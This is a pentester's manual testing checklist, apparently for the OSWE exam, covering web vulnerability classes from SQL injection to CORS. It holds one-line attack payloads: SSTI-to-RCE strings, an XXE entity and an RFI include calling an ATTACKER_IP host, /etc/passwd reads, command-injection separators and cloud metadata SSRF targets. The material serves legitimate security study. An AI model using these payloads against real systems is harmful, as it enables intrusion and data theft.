# OSWE - Manual testing checklist by vulnerability (v2, expanded)

Quick review of what to test manually for each vuln type before automating anything.

## SQL Injection (SQLi)

1. **Basic detection**: add `'`, `"`, `)`, `--`, `#` to each parameter (GET, POST, headers, cookies) and look for a SQL syntax error in the response.
2. **Boolean logic**: `id=1 AND 1=1` vs `id=1 AND 1=2` → compare the length/content of the response.
3. **Time-based**: `SLEEP(5)` (MySQL) / `WAITFOR DELAY '0:0:5'` (MSSQL) / `pg_sleep(5)` (Postgres).
4. **UNION-based**: find the number of columns with `ORDER BY n--` incrementing `n`, then `UNION SELECT 1,2,3...`.
5. **Out-of-band (OOB)**: if there's no response or delay, exfiltrate via DNS/HTTP (`LOAD_FILE`, `xp_dirtree`, `UTL_HTTP` in Oracle) to your listener.
6. **Context**: test in headers (`User-Agent`, `X-Forwarded-For`, `Referer`), cookies, JSON body, WebSocket messages, not just forms.
7. **Second order**: data stored "clean" in one place and used unsanitized in a different query elsewhere.
8. **NoSQL injection** (Mongo, etc.): try operators like `{"$ne": null}`, `{"$gt": ""}` in the JSON body; on a classic login form try `username[$ne]=x&password[$ne]=x` if it's form-encoded.

## SSTI (Server-Side Template Injection)

1. **Detection polyglot**: `${{<%[%'"}}%\.` — if any character disappears or breaks the page, there's template parsing happening.
2. **Confirm the engine with arithmetic**:
   - Jinja2/Twig: `{{7*7}}` → `49`
   - Freemarker: `${7*7}` → `49`
   - Velocity: `#set($x=7*7)$x` → `49`
   - ERB (Ruby): `<%= 7*7 %>` → `49`
   - Smarty: `{7*7}` → `49`
3. **Escalating to RCE**:
   - Jinja2: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
   - Twig: `{{ ['id']|filter('system') }}`
   - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
4. If `{{7*7}}` is reflected literally, there's no SSTI (probably XSS).

## XXE (XML External Entity)

1. Look for any endpoint that accepts XML (SOAP, `.docx`/`.xlsx`/SVG uploads, RSS/Atom feeds, config imports).
2. **Basic detection** (out-of-band with an external DTD):
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8000/xxe">]>
   <foo>&xxe;</foo>
   ```
3. **Local file read**:
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <foo>&xxe;</foo>
   ```
4. **Blind XXE with exfil via external parameter** (when there's no direct reflection): use an external DTD hosted on your server that reads the file and sends it over HTTP.
5. **SVG upload**: if the app allows SVG uploads and renders them server-side, that's a classic, often overlooked XXE vector.

## SSRF (Server-Side Request Forgery)

1. Any parameter that accepts a URL (webhooks, avatar from URL, PDF/thumbnail generator, "import from URL") is a candidate.
2. Test against internal metadata endpoints: `http://169.254.169.254/latest/meta-data/` (AWS), `http://169.254.169.254/metadata/v1/` (DO), `http://metadata.google.internal/...` (GCP, needs the `Metadata-Flavor: Google` header).
3. Test against internal services: `http://127.0.0.1:<port>`, `http://localhost:<port>`, internal ranges `10.x`/`192.168.x`.
4. Test URL filter bypasses: redirects (`http://short.link/...` that redirects internally), decimal/octal IP notation, `http://[::1]`, DNS rebinding.
5. Test other schemes if the URL parser accepts them: `file://`, `gopher://`, `dict://`.

## Insecure Deserialization

1. Look for suspicious blobs in cookies/parameters: base64 that decodes to `rO0AB...` (Java), `O:8:"...":` (PHP), or binary compatible with pickle (Python), or JSON with `$type`/`__type` (.NET / polymorphic Jackson).
2. **Java**: try `ysoserial` generating a known gadget chain (`CommonsCollections`, etc.) against the deserialization point.
3. **PHP**: look for POP chains (`__wakeup`, `__destruct`, `__toString` in available classes) and consider `phar://` deserialization if there are file functions (`file_exists`, `getimagesize`) over controlled input.
4. **Python**: if you see `pickle.loads()`, `yaml.load()` without `SafeLoader`, or `eval()`/`exec()` over session data → direct RCE.
5. **.NET**: ViewState (`__VIEWSTATE`) without a valid/disabled `MAC`, or `BinaryFormatter`/`JSON.NET` with insecure `TypeNameHandling`.

## JWT / Auth bypass

1. Decode the token (without verifying the signature) and check the claims (`role`, `is_admin`, `exp`) and headers (`alg`, `kid`, `jku`).
2. Try `alg: none`.
3. Try RS256→HS256 algorithm confusion using the public key as the HMAC secret.
4. Try brute-forcing a weak HS256 secret with a dictionary / `jwt_tool`.
5. Try injection via `kid` (path traversal, SQLi) or via `jku`/`x5u` (JWKS URL you control).
6. Check expiration: does the server actually validate `exp`? Can a token be reused after logout (no server-side invalidation)?

## IDOR (Insecure Direct Object Reference)

1. Change numeric IDs or UUIDs in URLs/parameters/body (`/api/orders/1042` → `1043`) while authenticated as a different, lower-privileged user.
2. Test on all methods: GET (reading someone else's data), PUT/PATCH (modification), DELETE (deleting someone else's data).
3. Also test identifiers inside the JSON body, not just the URL (`{"user_id": 5}` changed to another value).
4. Combine with ID enumeration (sequential) to gauge the real scope of impact (how many other users' records are accessible).

## Path Traversal / LFI / RFI

1. File parameters (`?file=`, `?template=`, `?page=`, downloads, previews): try `../../../../etc/passwd`, encoding variants (`%2e%2e%2f`, double encoding, null byte `%00` on older stacks).
2. **LFI to RCE**: if you can include a log (Apache/Nginx) or a PHP session file you partially control (log poisoning via User-Agent), you can achieve execution.
3. **RFI**: if the include accepts a remote URL (`?page=http://ATTACKER_IP/shell.txt`), direct RCE if `allow_url_include` is enabled (PHP).
4. Try wrappers if it's PHP: `php://filter/convert.base64-encode/resource=config.php` to read source without executing it, `phar://` for deserialization.

## Prototype Pollution (Node.js / JS)

1. Look for recursive merges or insecure JSON/query-string parsers (`_.merge`, misused `Object.assign`, `qs` with `__proto__`).
2. Try injecting `__proto__`, `constructor.prototype` in the JSON body or query string: `{"__proto__": {"isAdmin": true}}`.
3. Confirm real impact: does the polluted prototype affect auth logic, file paths, or reach a sink that executes code (known gadget in the app)?

## RCE (Remote Code Execution) — quick tests

1. **Command injection**: on parameters that call system utilities, try separators: `; id`, `| id`, `` `id` ``, `$(id)`, `& id`.
2. **Time-based confirmation (blind)**: `; sleep 5` if there's no visible output.
3. **Insecure deserialization**: see the dedicated section above.
4. **File upload → RCE**: upload a `.php`/`.jsp`/`.asp` disguised with an image content-type, check if it's accessible and executable at the upload path.

## XSS (quick reference — payloads in `js/js_cookies.js`)

1. Test every parameter reflected in HTML, attributes, and JS context (`<script>`).
2. Check the DOM: `innerHTML`, `document.write`, `eval`, use of `location.hash`/`location.search` without sanitization.
3. Confirm real impact: exfiltrate cookie/localStorage/CSRF token, not just `alert(1)`.
4. Also test stored XSS (profile, comments, filename) and self-XSS that triggers for an admin (support panel viewing user tickets).

## CSRF

1. Check whether there's a CSRF token; if there is, check whether it's actually validated (remove it, change it, reuse one from another session).
2. Check whether the session cookie's `SameSite` is `None`/unset (makes cross-site CSRF easier).
3. If there's a CSRF token but it can be read via GET without origin protection, chain read + use in a malicious request (see `csrfWithTokenTheft` in the JS).

## Race Conditions

1. Stateful business endpoints (redeeming a coupon, balance transfer, single vote, attempt limit) → send several concurrent requests (e.g. with `asyncio`/`threading` in Python or tools like Turbo Intruder) and check if the limit can be exceeded.
2. Pay attention to multi-step flows (e.g. "verify coupon" then "apply coupon" as separate steps) — the window between steps is usually where it fails.

## Open Redirect / Misconfigured CORS

1. Open redirect: parameters `?redirect=`, `?next=`, `?returnUrl=` pointing to an external domain — useful for chaining with OAuth/phishing.
2. CORS: check the `Access-Control-Allow-Origin` header — if it reflects any `Origin` and also sends `Access-Control-Allow-Credentials: true`, any site can read the victim's authenticated responses.

## General notes for the OSWE exam

- It's mainly **whitebox**: always review the source code before fuzzing blindly.
- Repeat every test across **all input methods**: GET, POST (form/JSON/multipart), headers, cookies, WebSocket.
- **Chain vulnerabilities**: an isolated low-impact SSTI/XSS/IDOR can be combined with another (CSRF, auth bypass, deserialization) to reach RCE or account takeover — a typical pattern in OSWE challenges.
- Document every PoC with the full request/response, because the final report matters as much as the exploitation itself.
